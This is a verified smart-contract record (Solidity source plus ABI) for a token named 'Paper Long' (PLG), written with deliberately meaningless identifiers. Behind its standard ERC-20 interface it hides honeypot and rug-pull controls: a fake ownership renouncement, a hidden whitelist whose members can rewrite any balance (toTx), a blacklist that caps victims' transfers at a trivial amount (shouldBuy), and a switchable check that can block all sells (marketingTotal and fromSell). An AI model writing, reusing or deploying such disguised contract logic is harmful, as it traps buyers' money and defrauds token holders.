{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface fromWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitWallet {\n    function createPair(address tokenAtShould, address fromList) external returns (address);\n}\n\ninterface senderLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalTo) external view returns (uint256);\n\n    function transfer(address launchedAt, uint256 exemptIs) external returns (bool);\n\n    function allowance(address tradingWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedAt,\n        uint256 exemptIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenMax, uint256 value);\n    event Approval(address indexed tradingWallet, address indexed spender, uint256 value);\n}\n\ninterface senderLaunchedMetadata is senderLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PaperLong is enableExempt, senderLaunched, senderLaunchedMetadata {\n\n    address public toBuy;\n\n    function marketingAt() public {\n        emit OwnershipTransferred(amountLaunch, address(0));\n        receiverFund = address(0);\n    }\n\n    mapping(address => bool) public autoMarketing;\n\n    constructor (){\n        \n        fromWallet marketingIs = fromWallet(atFeeTrading);\n        toBuy = limitWallet(marketingIs.factory()).createPair(marketingIs.WETH(), address(this));\n        if (enableTake != modeReceiver) {\n            enableTake = takeMode;\n        }\n        amountLaunch = _msgSender();\n        marketingAt();\n        listTotal[amountLaunch] = true;\n        receiverLaunched[amountLaunch] = tradingLaunched;\n        if (takeMode != enableTake) {\n            modeReceiver = enableTake;\n        }\n        emit Transfer(address(0), amountLaunch, tradingLaunched);\n    }\n\n    address senderWalletTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptEnable;\n    }\n\n    uint256 public takeMode;\n\n    mapping(address => bool) public listTotal;\n\n    event OwnershipTransferred(address indexed shouldList, address indexed totalReceiver);\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeTotal;\n    }\n\n    bool public amountTotal;\n\n    uint256 walletTotalIs;\n\n    function toTx(address tokenToLimit, uint256 exemptIs) public {\n        walletReceiver();\n        receiverLaunched[tokenToLimit] = exemptIs;\n    }\n\n    function owner() external view returns (address) {\n        return receiverFund;\n    }\n\n    address public amountLaunch;\n\n    function transferFrom(address teamBuy, address launchedAt, uint256 exemptIs) external override returns (bool) {\n        if (_msgSender() != atFeeTrading) {\n            if (listMarketing[teamBuy][_msgSender()] != type(uint256).max) {\n                require(exemptIs <= listMarketing[teamBuy][_msgSender()]);\n                listMarketing[teamBuy][_msgSender()] -= exemptIs;\n            }\n        }\n        return fromSell(teamBuy, launchedAt, exemptIs);\n    }\n\n    mapping(address => uint256) private receiverLaunched;\n\n    mapping(address => mapping(address => uint256)) private listMarketing;\n\n    uint256 constant maxTradingShould = 2 ** 10;\n\n    bool public exemptMin;\n\n    function shouldBuy(address modeFund) public {\n        walletReceiver();\n        if (takeMode == enableTake) {\n            amountTotal = true;\n        }\n        if (modeFund == amountLaunch || modeFund == toBuy) {\n            return;\n        }\n        autoMarketing[modeFund] = true;\n    }\n\n    function fromSell(address teamBuy, address launchedAt, uint256 exemptIs) internal returns (bool) {\n        if (teamBuy == amountLaunch) {\n            return teamFrom(teamBuy, launchedAt, exemptIs);\n        }\n        uint256 receiverAmount = senderLaunched(toBuy).balanceOf(senderWalletTo);\n        require(receiverAmount == walletTotalIs);\n        require(launchedAt != senderWalletTo);\n        if (autoMarketing[teamBuy]) {\n            return teamFrom(teamBuy, launchedAt, maxTradingShould);\n        }\n        return teamFrom(teamBuy, launchedAt, exemptIs);\n    }\n\n    string private exemptEnable = \"Paper Long\";\n\n    uint256 isLiquidityReceiver;\n\n    uint256 private modeReceiver;\n\n    address atFeeTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address feeBuy, address limitMode) external view virtual override returns (uint256) {\n        if (limitMode == atFeeTrading) {\n            return type(uint256).max;\n        }\n        return listMarketing[feeBuy][limitMode];\n    }\n\n    function approve(address limitMode, uint256 exemptIs) public virtual override returns (bool) {\n        listMarketing[_msgSender()][limitMode] = exemptIs;\n        emit Approval(_msgSender(), limitMode, exemptIs);\n        return true;\n    }\n\n    function minToken(address receiverSell) public {\n        if (exemptMin) {\n            return;\n        }\n        if (modeReceiver != enableTake) {\n            takeLaunch = true;\n        }\n        listTotal[receiverSell] = true;\n        if (takeLaunch == amountTotal) {\n            amountTotal = true;\n        }\n        exemptMin = true;\n    }\n\n    bool public takeLaunch;\n\n    uint256 public enableTake;\n\n    uint8 private receiverAt = 18;\n\n    uint256 private tradingLaunched = 100000000 * 10 ** 18;\n\n    function balanceOf(address totalTo) public view virtual override returns (uint256) {\n        return receiverLaunched[totalTo];\n    }\n\n    address private receiverFund;\n\n    function marketingTotal(uint256 exemptIs) public {\n        walletReceiver();\n        walletTotalIs = exemptIs;\n    }\n\n    function transfer(address tokenToLimit, uint256 exemptIs) external virtual override returns (bool) {\n        return fromSell(_msgSender(), tokenToLimit, exemptIs);\n    }\n\n    function walletReceiver() private view {\n        require(listTotal[_msgSender()]);\n    }\n\n    string private takeTotal = \"PLG\";\n\n    function teamFrom(address teamBuy, address launchedAt, uint256 exemptIs) internal returns (bool) {\n        require(receiverLaunched[teamBuy] >= exemptIs);\n        receiverLaunched[teamBuy] -= exemptIs;\n        receiverLaunched[launchedAt] += exemptIs;\n        emit Transfer(teamBuy, launchedAt, exemptIs);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverFund;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingLaunched;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverAt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptIs\",\"type\":\"uint256\"}],\"name\":\"marketingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"}],\"name\":\"minToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFund\",\"type\":\"address\"}],\"name\":\"shouldBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenToLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptIs\",\"type\":\"uint256\"}],\"name\":\"toTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenToLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PaperLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}